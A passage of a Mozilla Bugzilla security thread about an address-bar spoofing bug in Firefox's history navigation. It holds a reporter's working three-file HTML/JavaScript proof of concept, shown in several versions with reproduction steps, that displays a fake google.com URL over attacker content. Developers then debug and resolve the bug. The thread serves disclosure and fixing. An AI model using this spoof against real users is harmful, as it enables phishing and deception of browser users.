    setTimeout('win.location = "http://testtest.com:1"', 4000);
    setTimeout('win.location = "http://localhost/exploring/test.html"', 6000);
    setTimeout('win.location.replace("http://localhost/exploring/test3.html");', 8000)
</script>
</body>
</html>

```

test.html

```
<html>
<body>
<script>
    setTimeout('window.history.go(-3); window.history.go(-1);', 250);
</script>
</body>
</html>

```

test3.html:

```
<html>
<p>THIS IS PARAGRAPH</p>
<a href="http://abcd.abcde" id=mylink>link</a>
<script>
    window.history.go(-2);
</script>
</html>

```

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1528587#c17)• 6 years ago |
|  | |

This is the correct version, sorry for bothering you, but I have mistakenely made a typo error and I just wanted to post a valid code so this is the reason for another comment.

(In reply to Adrian from [comment #16](/show_bug.cgi?id=1528587#c16 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Created [attachment 9054357](/attachment.cgi?id=9054357 "poc-no-user-interaction.mkv") [[details]](/attachment.cgi?id=9054357&action=edit "poc-no-user-interaction.mkv")
>
> poc-no-user-interaction.mkv
>
> Hi Team,
>
> I have developed slightly modified version of my exploit. It turned out there is no user interaction needed at all. This Attack could have been used for a mass pwnage. It is only required victim visits specially crafted website. Please take it into account. I have attached another video with the proof. Following is the code I am using now. The timings is here adjusted to high values just in order to show you each steps. I am using three html files: test.html, test2.html and test3.html
>
> Victim is only required to open test2.html file.
>
> test2.html:
>
> <html>
>
> <body>
>
> </script>
>
> win = window.open("<https://google.com:1>");
>
> setTimeout('win.location = "<http://localhost/>"', 2000);
>
> setTimeout('win.location = "<http://testtest.com:1>"', 4000);
>
> setTimeout('win.location = "<http://localhost/exploring/test.html>"', 6000);
>
> setTimeout('win.location.replace("<http://localhost/exploring/test3.html>")', 8000);
>
> </script>
>
> </body>
>
> </html>
>
> test.html
>
> <html>
>
> <body>
>
> <script>
>
> setTimeout('window.history.go(-3); window.history.go(-1);', 250);
>
> </script>
>
> </body>
>
> </html>
>
> test3.html:
>
> <html>
>
> <p>THIS IS PARAGRAPH</p>
>
> <a href="<http://abcd.abcde>" id=mylink>link</a>
>
> <script>
>
> window.history.go(-2);
>
> </script>
>
> </html>

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1528587#c18)• 6 years ago |
|  | |

Hi,

It is almost 3 weeks without any information. 4 days ago I have attached video poc along with code proving that no user interaction is needed to perform the attack. Given the fact my technique is working on almost every Firefox release to date it would be great to know the proper severity now. Eventually I would really appreciate any info regarding planned fix/patch date. Is it possible for you to deliver it before next major release?

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a4736238_424719)• 6 years ago |

Flags: needinfo?(kyle)

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1528587#c19)• 6 years ago |
|  | |

Ugh was updating CC list while discussing this with someone and un'ni'd myself again. Looking at some of the potential session history issues.

Flags: needinfo?(kyle)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1528587#c20)• 6 years ago |
|  | |

I couldn't reproduce with the automated testcases, but the steps from [comment 10](/show_bug.cgi?id=1528587#c10 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") work for me.

So far it looks like session history is passing the right info into nsDocShell, trying to figure out what goes wrong next.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1528587#c21)• 6 years ago |
|  | |

Actually, I take that back. The URI in the session history entry is "<https://google.com:1/>", but its shared entry's document looks to be for the poc.html file.

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1528587#c22)• 6 years ago |
|  | |

In order to reproduce the issue with automated testcase it is necessary to serve those 3 html files. My poc proving there is no user interaction needed is composed of three html files. And it works like a charm for me every time. I have also provided video "poc-no-user-interaction.mkv" showing exact steps. If you're having some troubles though please ensure you're doing it this way:

1. Install some kind of webserver, I have tested it using apache2 for Linux
2. copy following three html files to one location. I have created directory named "poc" under which all html files are served

test2.html

<!DOCTYPE html>

<html>

<body>

<p>THIS IS POC</p>

<script>

win = window.open("<https://google.com:1>");

setTimeout('win.location = "<http://localhost/>"', 1000);

setTimeout('win.location = "<http://testtest.com:1>"', 2500);

setTimeout('win.location = "<http://localhost/poc/test.html>"', 3500);

setTimeout('win.location.replace("<http://localhost/poc/test3.html>");', 4500);

</script>

</body>

</html>

test3.html

<!DOCTYPE html>

<html>

<script>

window.history.go(-2);

</script>

</html>

test.html

<!DOCTYPE html>

<html>

<body>

<p>Hello World this is my Content</p>

<script>

setTimeout('window.history.go(-3); window.history.go(-1);', 250);

</script>

</body>

</html>

3. Open web browser, and type <http://youraddr/poc/test2.html> into the address bar then click enter to load the resource. I created directory "poc" which is hosting my html files and so I am invoking test2.html like that:

   <http://localhost/poc/test2.html>
4. The result should be <https://google.com:1> in the address bar of new tab and the content of test.html file. Please let me know if you managed to reproduce it.

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a6922447_424719)• 6 years ago |

Flags: needinfo?(kyle)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1528587#c23)• 6 years ago |
|  | |

Hi,

Can anybody please answer few questions?

1: Is this vulnerability getting any attention?

2: Does it qualify for CVE/bounty ?

3: When you're planning to release the patch?

4: Why almost 90 days its not enough to fix the issue?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1528587#c24)• 6 years ago |
|  | |

Neha, radar'ing this to you - can you help move this forward? Thanks.

Flags: needinfo?(nkochar)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1528587#c25)• 6 years ago |
|  | |

I have been trying to figure out what's going wrong, it's just complicated to figure out even with rr.

The viewer of the second load is set on the entry for the first load, by nsDocumentViewer::Destroy using its mSHEntry. The entry for the first load is set on the viewer for the second load in nsDocumentViewer::Close, where we set that mSHEntry. That nsDocumentViewer::Close call comes from nsDocShell::SetupNewViewer. I think that the mContentViewer of that nsDocShell is for the second load at that point, but the mOSHE is for the first load. I think I've found the point where we set the mOSHE. Next is determining why we set mOSHE to the entry for the first load even though the viewer is for the second load.

Assignee: nobody → petervFlags: needinfo?(nkochar)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1528587#c26)• 6 years ago |
|  | |

(In reply to Adrian from [comment #23](/show_bug.cgi?id=1528587#c23 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> 1: Is this vulnerability getting any attention?

Yes.

> 2: Does it qualify for CVE/bounty ?

That's for the security team to determine, sec-moderate bugs don't automatically qualify for a bounty iirc.

`

> 3: When you're planning to release the patch?

When we actually have a patch to release :-).

> 4: Why almost 90 days its not enough to fix the issue?

We're trying to fix it, but it's complicated to figure out what exactly is going wrong.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1528587#c27)• 6 years ago |
|  | |

Here's what I think is happening when we're executing the two lines:

```
window.history.go(-1);
window.history.go(1);

```

The first go triggers a load from the history entry, and we set mLSHE. Before the load triggers the setup of a new viewer we execute the second go. At this point `nsDocShell::Stop` is called, but because the first go was loading an error page we store mLSHE into mOSHE (<https://searchfox.org/mozilla-central/rev/a887c90ea9c19a0b5529a1f5fa351929944887ba/docshell/base/nsDocShell.cpp#4702>). We then also store the previous content viewer on the entry in mOSHE, even though we haven't created a new viewer between the two loads from history entries.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1528587#c28)• 6 years ago |
|  | |

Smaug, I already discussed this a bit with bz, and he wanted to get your opinion.

The basic issue is that if we load an error page we store the mLSHE into the mOSHE, even if the load of the error page was interrupted before the content viewer for the error page was set up. The nulling of mLSHE in nsDocShell::Stop is necessary because nsDocShell::EndPageLoad is never called for error pages (we don't get state changes for those). We could try to check for this specific case somehow (checking the document in mContentViewer for an error page?) and then skip the nulling of mLSHE in nsDocShell::Stop. But maybe you have a better idea?

Flags: needinfo?(bugs)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a8079784_24295)• 6 years ago |

Status: NEW → ASSIGNED

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1528587#c29)• 6 years ago |
|  | |

That sounds reasonable to me, null mLSHE later (and hopefully making error loading more similar to normal pages).

But without debugging this I don't have a good idea where to do it.

Flags: needinfo?(bugs)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1528587#c30)• 6 years ago |
|  | |

hi, how about patch ? ;) this technique doesn't work any more for the newest Firefox version which can suggest you've done something with it

either you patched it or it has been patched by itself magically;). It would be great to finally obtain information regarding severity of this bug.

Please note I have included poc working without user interaction other than going into attacker site(clicking link). I shared this bug also because I wanted to get CVE at least. How long would it take for you to finally close this?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1528587#c31)• 6 years ago |
|  | |

(In reply to Adrian from [comment #23](/show_bug.cgi?id=1528587#c23 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Can anybody please answer few questions?

Asking here in a bug gives no guarantee that questions directed to other folks will be answered, as an FYI. Security bounty questions should be sent to security@mozilla.org per our client bounty FAQ at <https://www.mozilla.org/en-US/security/client-bug-bounty/> (which I assume you've read if you're interested in bounties).

> 1: Is this vulnerability getting any attention?

There is attention in this bug. That is where the bug activity will occur. There is no other channel where it will happen.

> 2: Does it qualify for CVE/bounty ?

CVEs are assigned when a bug is fixed, during the process for the release it is fixed in, unless there is a reason to do so.

Bounty questions should not be asked in the bug but in email to security@mozilla.org, as the client FAQ above states.

The FAQ says:

"If you have filed the bug directly in Bugzilla without using the Bugzilla client bug bounty form, notify the Mozilla Security Group by email to security@mozilla.org and include the number of the bug you filed and a mention that you are submitting it for bounty consideration. Do not send the actual vulnerability via email."

> 3: When you're planning to release the patch?

There is no specific plan because the bug is not fixed yet. When we have a patch for it that is reviewed and approved, then we will know when it is fixed.

> 4: Why almost 90 days its not enough to fix the issue?

Because this is a sec-moderate issues and people are often assigned a variety of work and other work takes a higher priority (such as high or critical rated security issues).

(In reply to Adrian from [comment #30](/show_bug.cgi?id=1528587#c30 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> hi, how about patch ? ;) this technique doesn't work any more for the newest Firefox version which can suggest you've done something with it
>
> either you patched it or it has been patched by itself magically;).

Or it was fixed by other work that has been done, which often happens as we clean up code.

> It would be great to finally obtain information regarding severity of this bug.

It is rated sec-moderate and has been fro some time. That's the Mozilla severity rating of it when it comes to security.

> Please note I have included poc working without user interaction other than going into attacker site(clicking link). I shared this bug also because I wanted to get CVE at least. How long would it take for you to finally close this?

When we the developers who have been looking at it verify that it is fixed.

If it was incidentally "fixed" or the poc just no longer reproduces, it may not be assigned a CVE. It depends on the change that affected the issue.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1528587#c32)• 6 years ago |
|  | |

Peter, can you take a look at this and see what might have changed to cause the poc to no longer work?

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1528587#c33)• 6 years ago |
|  | |

The steps to reproduce from [comment 10](/show_bug.cgi?id=1528587#c10 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") still work for me. None of the "automated" poc ever worked. I don't think anything has changed.

Flags: needinfo?(peterv)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1528587#c34)• 6 years ago |
|  | |

Some time ago I have included video proving that all steps can be indeed automated and the only thing user is required to do is to get to the attacker page. I can easily reproduce it all the time using [comment 22](/show_bug.cgi?id=1528587#c22 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") methodology. I have also posted video proving it can be done.. If you feel not competent enough to reproduce it then I think I will rather contact security team directly.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1528587#c35)• 6 years ago |
|  | |

(In reply to Adrian from [comment #34](/show_bug.cgi?id=1528587#c34 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Some time ago I have included video proving that all steps can be indeed automated and the only thing user is required to do is to get to the attacker page. I can easily reproduce it all the time using [comment 22](/show_bug.cgi?id=1528587#c22 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") methodology. I have also posted video proving it can be done..

Your [comment 22](/show_bug.cgi?id=1528587#c22 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") involves a bunch of setTimeout calls that likely work out differently on different machines and configurations, which means that automated testcase hasn't worked for any of the other people CC'd on this bug who have attempted to use it.

That's fine, we're still aware there's a problem and will still be investigating how to fix this. It does mean we have no idea why your automated steps "stopped working" for you. It's quite possible some of the timings shifted for you as a result of performance improvements or something else relating to the runtime environment, rather than a "secret fix" for this bug landing.

> If you feel not competent enough to reproduce it then I think I will rather contact security team directly.

Please see the etiquette guidelines at <https://bugzilla.mozilla.org/page.cgi?id=etiquette.html> - insulting people is not acceptable.

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1528587#c36)• 6 years ago |
|  | |

Hi,

Indeed it is still working, at least on Windows 7.

I have tested it on Windows 10 Enterprise as well and its not working here.

Regards

|  | [Neha Kochar [:neha]](/user_profile?user_id=627348) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a11891656_627348)• 6 years ago |

Priority: -- → P2

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1528587#c37)• 5 years ago |
|  | |

Hi,

Two months ago this bug has been marked with P2 priority. I thought that P2 means that this bug will be patched with the new release which was delivered today. Please let me know if it is going to be patched, if CVE will be assigned etc.

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1528587#c38)• 5 years ago |
|  | |

hi is there any news regarding this issue ? I seen cve assigned for some moderate and even low issues. If my finding does not qualify for you just please let me know so I will not wait any longer and publish it. Regards

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a21384968_20209)• 5 years ago |

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1528587#c39)• 5 years ago |
|  | |

This appears to have been fixed in Firefox 70, or if not "fixed" at least the testcase was broken. Now you end up on the test3.html page, showing the correct test3 URL in the addressbar.

I saw the broken behavior in Firefox 69, and I still see the broken behavior in ESR-68 which we will support until summer. From the testcase it appears test3 (showing "attacker" content) may have been the point, but I always saw the blank content from test.html. Easy enough to put phishy content on that page instead (which I did to satisfy myself). Got the same behavior on the now-EOL ESR-60

As a spoof it's still not all that convincing (e.g. there's no lock). Some actual phish on close-enough names are more convincing, although those can in theory end up being blocked by SafeBrowsing and these unreachable names won't.

Much more concerning is that internally we think the document.location is the fake domain, although document.domain is correct. I haven't tested but I bet any internal security checks relying on the document URI rather than the principal will get it wrong. It's an invalid origin and won't be same-origin with anything juicy, but to the extent it's same-site with them that will be a problem. Broadly speaking I'm guessing "engine" features will get it right (using principals) and front-end features won't. Confidence in that guess boosted by the first one I tried: the DevTools storage tab shows cookies for the real `.google.com` domain, but the page content itself doesn't see them in `document.cookie`.

This will likely get a CVE when we publish an advisory, but we don't get around to that until we've fixed them. As Al said back in [comment 31](/show_bug.cgi?id=1528587#c31 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"), stop asking in the bug because the developers don't know. Mail the security alias.

Peter: although the testcase is now "worksforme" I'm not sure that this is in fact "fixed" in Firefox 70. Did we make a change that is an actual fix, or is it just some unrelated change that broke the testcase with the underlying problem still lurking? Either way can we identify it and port it back to the ESR branch?

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=%3F)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=%3F)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B)Flags: needinfo?(dveditz) → needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1528587#c40)• 5 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #39](/show_bug.cgi?id=1528587#c39 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Peter: although the testcase is now "worksforme" I'm not sure that this is in fact "fixed" in Firefox 70. Did we make a change that is an actual fix, or is it just some unrelated change that broke the testcase with the underlying problem still lurking? Either way can we identify it and port it back to the ESR branch?

I'm not aware of a fix specifically for this. I'll try to figure out if the underlying problem is still there, but I suspect it is.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1528587#c41)• 5 years ago |
|  | |

I think asynchronous history navigations ([bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")) might have fixed this. Sounds a bit scary to port to ESR.

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1528587#c42)• 5 years ago |
|  | |

(In reply to Peter Van der Beken [:peterv] from [comment #41](/show_bug.cgi?id=1528587#c41 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> I think asynchronous history navigations ([bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")) might have fixed this.

That being said, I'm not completely sure that the problem from [comment 27](/show_bug.cgi?id=1528587#c27 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") couldn't cause other problems like this.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a24077472_451704)• 5 years ago |

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1528587#c43)• 5 years ago |
|  | |

I have been thinking how this could still happen with async history navigations fixed ([bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")), but so far I haven't been able to find a way. We should still try to implement the solution from [comment 28](/show_bug.cgi?id=1528587#c28 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"), once we figure out where we can move the nulling of mLSHE for error loads.

|  | [Neha Kochar [:neha]](/user_profile?user_id=627348) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1528587#c44)• 5 years ago |
|  | |

Peter, would it be best to track this for 73 instead of the earlier releases since it still needs some work here?

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1528587#c45)• 5 years ago |
|  | |

I've verified that turning off async history navigations with the pref makes the bug reappear with the steps from [comment 10](/show_bug.cgi?id=1528587#c10 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"). A fix for that will take more time, so I think tracking for 73 would make more sense. But for now, async history navigations seem like a good enough proetection against this.

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1528587#c46)• 5 years ago |
|  | |

[Tracking Requested - why for this release]: see [comment 45](/show_bug.cgi?id=1528587#c45 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports")

[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%3F)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%3F)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%3F)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1528587#c47)• 5 years ago |
|  | |

70 is a past release, 71 is our current release but will be replaced by 72 in 5 weeks. Adjusting flag requests to actually track 73 and 72 which are the releases that could potentially be targeted for a fix/uplift.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix)
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=-)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=-)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%3F)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1528587#c48)• 5 years ago |
|  | |

Per comments 44/45 it sounds like this is not likely for 72.

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=-)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a25620243_75935)• 5 years ago |

[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1528587#c49)• 5 years ago |
|  | |

[Bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous") is going to land on branches, and should fix this. I guess I could move the followup work to a separate bug.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1528587#c50)• 5 years ago |
|  | |

So the original security bug aspect here has been fixed since Fx70 it looks like, via [bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")? If so we should resolve this bug so it triggers our advisory-writing and CVE assignment processes.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) → [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix) → [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed)
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional) → [fixed](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fixed)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1528587#c51)• 5 years ago |
|  | |

After discussing this with Dan, I don't think this bug is severe enough to warrant taking the risk of uplifting [bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous") to the ESR release as a work-around. I'd be open to eventually taking a patch for the root cause if it's not too scary in the end. FWIW, I agree that it might be better to spin off a new bug for that work for better tracking.

Flags: needinfo?(peterv)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1528587#c52)• 5 years ago |
|  | |

Hi,

Just wondering, is it oficially patched? does it entered advisory-writing and cve assignment process?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a33542899_580382)• 5 years ago |

Flags: needinfo?(tom)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1528587#c53)• 5 years ago |
|  | |

I filed [bug 1622095](/show_bug.cgi?id=1622095 "NEW") to cover the follow-up fixes Peter mentioned so we can mark this one resolved as a security issue.

Status: ASSIGNED → RESOLVEDClosed: 5 years agoFlags: needinfo?(tom)Resolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a33685127_75935)• 5 years ago |

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=-)Flags: needinfo?(peterv)Target Milestone: --- → mozilla70

